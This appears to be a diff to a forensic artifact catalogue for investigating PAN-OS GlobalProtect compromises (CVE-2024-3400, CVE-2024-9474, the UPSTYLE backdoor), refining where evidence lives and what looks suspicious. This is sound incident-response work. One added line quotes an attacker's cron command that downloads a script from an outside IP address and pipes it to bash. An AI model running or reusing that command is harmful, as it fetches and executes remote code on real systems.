@@ -26,7 +26,7 @@ collection:
     description: Cron, site-packages and web-root files the TSF may not carry, and memory. Only through a support case.
     confidence: medium
 volatility:
-  - Logs from the previous install become inaccessible after an upgrade (vendor advisory for CVE-2024-3400)
+  - Some logs from the prior installation become inaccessible on the device after an upgrade (vendor advisory for CVE-2024-3400); support may still help investigate the prior installation
   - mp-monitor netstat and top snapshots in the TSF are the closest thing to historical process state
 anti_forensics:
   - technique: Deleted its own log lines and restored file timestamps
@@ -113,32 +113,59 @@ artifacts:
     evidence_type: [execution, exfiltration]
     confidence: high
     collected_by: ingest
-    description: UPSTYLE wrote command output into this served CSS file and restored its timestamp afterwards. Compare against a clean copy of the same release.
+    description: >-
+      UPSTYLE appended command output to this served CSS file and restored the
+      original file and its timestamps about 15 seconds later, so a hash match
+      does not clear the device. Compare against a clean copy of the same release.
     seen_in: [UPSTYLE]
     provides: >-
       A file the portal serves to anyone.
     normal: >-
       Byte-identical to the same file in a clean install of the same release.
     suspicious: >-
-      A different hash or appended text, whatever the timestamp says - UPSTYLE
-      restored it.
+      Any difference from a clean copy. The absence of a difference proves
+      nothing: Volexity says the original was restored after 15 seconds.
     basis: researcher
-  - locator: /var/appweb/sslvpndocs/global-protect/portal/js/* and /var/appweb/htdocs/unauth/*
+  - locator: /var/appweb/sslvpndocs/global-protect/*.css and /var/appweb/htdocs/unauth/*
     class: filesystem
     volatility: stable
     forensic_value: high
     evidence_type: [exfiltration, persistence]
     confidence: medium
     collected_by: ingest
-    description: Unauthenticated web roots. Copies of running_config.xml and web shells were staged here for retrieval without credentials.
-    seen_in: [CVE-2024-3400, CVE-2024-0012]
+    description: >-
+      Unauthenticated web roots. For CVE-2024-3400, running-config.xml was copied
+      to a .css file in the global-protect directory (Volexity, Unit 42).
+      /var/appweb/htdocs/unauth/ is the write path in watchTowr's proof of concept
+      for CVE-2024-9474 (researcher; not an in-the-wild report).
+    seen_in: [CVE-2024-3400, CVE-2024-9474]
     provides: >-
       Everything reachable on the portal without logging in.
     normal: >-
       The release's own scripts, styles and images.
     suspicious: >-
-      Copies of running_config.xml, PHP or JSP files, or anything newer than the
-      install.
+      Copies of running-config.xml (a .css file that starts with <config),
+      PHP or JSP files, or anything newer than the install.
+    basis: researcher
+  - locator: /var/log/syslog-system.log (and dated copies, inside the TSF)
+    class: system-logs
+    volatility: rotating
+    forensic_value: high
+    evidence_type: [persistence, execution, timeline]
+    confidence: medium
+    collected_by: ingest
+    description: >-
+      Volexity: "This log file is located at /var/log/syslog-system.log and
+      contains various entries related to crond executions and other system
+      activity." It is where the CVE-2024-3400 cron persistence showed.
+    seen_in: [CVE-2024-3400]
+    provides: >-
+      crond execution records with the command each job ran.
+    normal: >-
+      crond running the release's own jobs.
+    suspicious: >-
+      crond running a download piped to a shell, as in Volexity's example
+      "crond[18423]: (root) CMD (wget -qO- http://172.233.228.93/policy | bash)".
     basis: researcher
   - locator: mp-monitor.log (inside the TSF)
     class: process
@@ -180,15 +207,17 @@ artifacts:
     evidence_type: [timeline, configuration]
     confidence: high
     collected_by: show_log_system
-    description: System, configuration-audit and authentication logs. crond lines in the system log are where the cron persistence first shows.
+    description: >-
+      System, configuration-audit and authentication event logs. The crond lines
+      Volexity used for the cron persistence are in /var/log/syslog-system.log in
+      the tech support file, a different log; no source shows them here.
     provides: >-
       System, configuration-audit and authentication events.
     normal: >-
       Logins by known administrators from management addresses; changes that match
       change control.
     suspicious: >-
-      crond lines running downloads, logins from new sources, configuration changes
-      nobody owns.
+      Logins from new sources and configuration changes nobody owns.
     basis: toolkit
   - locator: Panorama / syslog receiver copies of the above
     class: off-box
